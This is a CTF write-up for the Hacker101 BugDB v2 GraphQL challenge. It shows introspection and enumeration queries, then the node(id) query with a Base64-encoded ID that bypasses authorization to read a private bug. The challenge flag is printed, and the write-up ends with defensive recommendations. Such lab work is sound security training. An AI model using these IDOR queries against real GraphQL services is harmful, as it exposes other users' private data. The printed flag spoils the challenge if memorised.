@@ -1,0 +1,307 @@
+================================
+LAB: BugDB v2
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 1, 2026
+Lab URL: Hacker101 CTF - BugDB v2 Challenge
+Category: Web Security - GraphQL
+Level: Medium
+Objective: Exploit GraphQL API to access private bug report and retrieve the flag
+Description: BugDB v2 is the second iteration of the BugDB challenge on Hacker101 CTF. It features an improved GraphQL API that fixes the Bugs vs Bugs_ type inconsistency from v1, but introduces a new vulnerability in the Node interface implementation.
+
+[RECONNAISSANCE]
+----------------
+
+1. Initial Discovery:
+   - GraphQL endpoint available at /graphql
+   - GraphiQL interface enabled for testing
+   - Compared to v1, immediately noticed architectural changes
+
+2. Type Enumeration via Introspection:
+   - Executed schema introspection query:
+     {
+       __schema {
+         types {
+           name
+           kind
+           description
+         }
+       }
+     }
+
+   - Identified custom types:
+     * Query (entry point)
+     * Users
+     * Bugs (single unified type - Bugs_ removed from v1)
+     * MyMutations (new in v2)
+     * modifyBug (new mutation type in v2)
+
+3. Comparison with v1:
+   - v1 had separate Bugs and Bugs_ types (inconsistent field exposure)
+   - v2 consolidated into single Bugs type with text field exposed
+   - v2 introduced mutation capabilities
+   - No bugs relation field on Users type anymore
+
+4. Query Discovery:
+   - Mapped available queries on Query type:
+     {
+       __type(name: "Query") {
+         fields {
+           name
+           args {
+             name
+             type { name }
+           }
+         }
+       }
+     }
+
+   - Available queries:
+     * node(id: ID!)
+     * user (with pagination)
+     * findUser(username: String)
+     * findBug(_: String)
+     * allUsers (with pagination)
+     * allBugs (no pagination - returns array directly)
+
+5. Type Structure Analysis:
+
+   Users type fields:
+   - id (NON_NULL)
+   - username (String)
+   - No bugs relationship field (removed from v1)
+
+   Bugs type fields:
+   - id (NON_NULL)
+   - reporterId (Int)
+   - text (String) - exposed directly now
+   - private (Boolean)
+   - reporter (Users object)
+
+6. Mutation Discovery:
+   - Explored MyMutations type:
+     {
+       __type(name: "MyMutations") {
+         fields {
+           name
+           args {
+             name
+             type { name kind }
+           }
+         }
+       }
+     }
+
+   - Found modifyBug mutation:
+     * Arguments: id (Int), private (Boolean), text (String)
+     * Likely intended as distraction/future attack vector
+
+7. User Enumeration:
+   - Listed all users:
+     {
+       allUsers {
+         edges {
+           node {
+             id
+             username
+           }
+         }
+       }
+     }
+
+   - Results:
+     * admin (ID: VXNlcnM6MQ==, decoded: Users:1)
+     * victim (ID: VXNlcnM6Mg==, decoded: Users:2)
+
+8. Bug Enumeration:
+   - Attempted to list bugs:
+     {
+       allBugs {
+         id
+         text
+         private
+         reporterId
+       }
+     }
+
+   - Results: Only one bug returned
+     * Bug QnVnczox (Bugs:1)
+     * Text: "This is an example bug"
+     * private: false
+     * reporterId: 1 (admin)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+
+1. Missing Authorization on Node Interface:
+   - The Node interface provides universal access to any object by ID
+   - Developers implemented access control on specific queries (allBugs, findBug)
+   - FORGOT to implement authorization checks on the node(id) resolver
+   - This creates an Insecure Direct Object Reference (IDOR) vulnerability
+
+2. Access Control Inconsistency:
+   - allBugs query: Filtered to show only public bugs OR user's own bugs
+   - findBug query: Same filtering applied
+   - node(id) query: NO FILTERING - direct database access without authorization
+
+3. Predictable ID Pattern:
+   - IDs follow Base64-encoded pattern: TypeName:NumericID
+   - Examples:
+     * QnVnczox = Bugs:1
+     * QnVnczoy = Bugs:2
+     * VXNlcnM6MQ== = Users:1
+   - Sequential numeric IDs allow enumeration
+
+4. Hidden Private Bug:
+   - Based on v1 pattern and enumeration results:
+     * Bug 1 exists and is public (admin's bug)
+     * Bug 2 likely exists but hidden from allBugs (victim's private bug)
+   - Hypothesis: Bug 2 contains the flag and is marked private: true
+
+5. Attack Vector Identified:
+   - Construct Bug:2 ID: "QnVnczoy" (Base64 of "Bugs:2")
+   - Access via node interface bypassing access controls
+   - Use GraphQL fragment syntax to specify Bugs type fields
+
+[EXPLOITATION]
+--------------
+
+Method 1 - Direct Node Interface Access (Successful):
+
+Step 1: Construct the target ID
+- Pattern identified: Bugs:1 → QnVnczox
+- Increment to Bugs:2 → QnVnczoy (Base64 encoding of "Bugs:2")
+
+Step 2: Attempt access via findBug (testing proper filtering)
+Query:
+{
+  findBug(_: "2") {
+    id
+    text
+    private
+    reporterId
+  }
+}
+
+Result: null (correctly filtered - can't access other users' private bugs)
+
+Step 3: Exploit node interface
+Query:
+{
+  node(id: "QnVnczoy") {
+    id
+    ... on Bugs {
+      text
+      private
+      reporterId
+    }
+  }
+}
+
+Result: SUCCESS - Retrieved private bug content
+
+Method 2 - Mutation-based Attack (Not Required):
+
+The modifyBug mutation was explored but not necessary for this challenge:
+- Could potentially be used to change private flag to false
+- Or modify text content
+- Would require proper mutation syntax and may have different authorization
+
+However, direct read access via node interface was sufficient to retrieve the flag.
+
+[EVIDENCE]
+----------
+
+Flag Retrieved:
+fc3958a309d56b3ba97ec26c0ab056fbda91526539477bce9dd2f34bacc93200
+
+Complete Response from node(id) query:
+{
+  "data": {
+    "node": {
+      "id": "QnVnczoy",
+      "text": "^FLAG^fc3958a309d56b3ba97ec26c0ab056fbda91526539477bce9dd2f34bacc93200$FLAG$",
+      "private": true,
+      "reporterId": 2
+    }
+  }
+}
+
+Comparison of Query Results:
+- allBugs: Returned only Bug 1 (public bug)
+- findBug(_: "2"): Returned null (correctly filtered)
+- node(id: "QnVnczoy"): Returned Bug 2 with flag (authorization bypass)
+
+User/Bug Mapping:
+- admin (Users:1): owns Bug 1 (public, example bug)
+- victim (Users:2): owns Bug 2 (private, contains flag)
+
+[LESSONS LEARNED]
+-----------------
+
+1. Node Interface Security Critical:
+   - The Relay Node interface is a generic access point to all objects
+   - Must implement the SAME authorization logic as specific queries
+   - Common developer mistake: secure specific endpoints, forget generic ones
+   - In this challenge: allBugs was secured, but node(id) was not
+
+2. Defense in Depth for GraphQL:
+   - Implement authorization at multiple levels:
+     * Query level (what queries can be executed)
+     * Field level (what fields can be accessed)
+     * Object level (what objects can be read)
+     * Resolver level (authorization in each data fetcher)
+   - The node resolver should check: "Does current user have permission to access this object?"
+
+3. Consistent Access Control Across Entry Points:
+   - Multiple paths to the same data must have identical authorization
+   - Paths in this challenge:
+     * allBugs → filtered correctly
+     * findBug → filtered correctly  
+     * node → NOT filtered (vulnerability)
+   - Missing one path = broken access control
+
+4. ID Obfuscation is Not Security:
+   - Base64 encoding of sequential IDs is easily reversible
+   - Predictable patterns (Bugs:1, Bugs:2, ...) enable enumeration
+   - Better approaches:
+     * Use UUIDs (non-sequential)
+     * Add HMAC/signature verification
+     * Most importantly: implement proper authorization regardless of ID format
+
+5. GraphQL Pentesting Methodology - Node Interface Focus:
+   - Always test the node(id) query with IDs from different user contexts
+   - Enumerate object IDs via legitimate queries, then test via node
+   - Compare results between specific queries and node interface
+   - Look for authorization inconsistencies across access paths
+   - Test with sequential ID patterns: increment/decrement known IDs
+
+6. Red Herrings in Security:
+   - The modifyBug mutation appeared threatening but was unnecessary
+   - Real vulnerability was simpler: direct read access via node
+   - Don't overcomplicate: test simple IDOR before complex mutations
+   - Always try direct object access patterns first
+
+7. Evolution from v1 to v2:
+   - v1 vulnerability: Type inconsistency (Bugs vs Bugs_)
+   - v2 fix: Consolidated to single Bugs type
+   - v2 new vulnerability: Node interface authorization bypass
+   - Fixing one issue doesn't guarantee overall security
+   - Each code change requires new security review
+
+8. Defense Recommendations:
+   - Implement field-level authorization resolvers for ALL entry points
+   - Add authorization check in node(id) resolver:
+     ```
+     if (object.private && object.reporterId !== currentUser.id) {
+       throw new Error("Unauthorized");
+     }
+     ```
+   - Consider disabling introspection in production
+   - Use non-sequential, non-predictable IDs (UUIDs)
+   - Implement query complexity limiting
+   - Log and alert on suspicious node(id) access patterns
+   - Apply principle of least privilege universally
+   - Test all GraphQL interfaces (node, connections, mutations) for authorization
